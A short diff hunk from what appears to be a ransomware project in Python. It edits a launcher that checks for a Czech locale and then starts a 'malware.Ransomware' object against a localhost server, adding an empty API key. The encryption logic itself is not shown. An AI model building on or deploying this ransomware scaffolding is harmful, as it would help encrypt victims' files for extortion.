@@ -12,7 +12,7 @@ def check_czech_locale():
 
 def run_rsw():
     if check_czech_locale():
-        ransomware = malware.Ransomware(server_base_url="http://localhost:8001") # Start path default as home, change if testing
+        ransomware = malware.Ransomware(server_base_url="http://localhost:8001", api_key="") # Start path default as home, change if testing
         ransomware.run()
 
 if __name__ == '__main__':
